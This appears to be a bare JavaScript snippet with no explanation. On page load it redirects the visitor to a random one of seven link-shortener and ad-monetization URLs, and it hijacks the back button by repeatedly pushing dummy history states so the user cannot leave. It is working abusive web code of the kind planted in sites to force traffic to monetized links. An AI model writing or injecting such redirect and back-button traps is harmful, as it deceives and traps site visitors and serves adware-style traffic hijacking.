var urls = [
  "https://besargaji.com/LAsKvPGv7Yt",
  "https://link.bicolink.net/bwR5gv6hnp",
  "https://arahlink.id/74VmU",
  "https://ouo.io/oHYJHgW",
  "https://adbull.me/sGMenH",
  "https://to.aoutoqw.xyz/euJ1AhAR",
  "https://go.aoutoqw.xyz/II4oyCqb"
];

function redirect() {
  var randomIndex = Math.floor(Math.random() * urls.length);
  var nextUrl = urls[randomIndex];
  window.location.replace(nextUrl);
}

if (typeof history.pushState === "function") {
  history.pushState("jibberish", null, null);
  window.addEventListener("popstate", function() {
    history.pushState("newjibberish", null, null);
  });
}

document.addEventListener("DOMContentLoaded", function() {
  redirect();
});

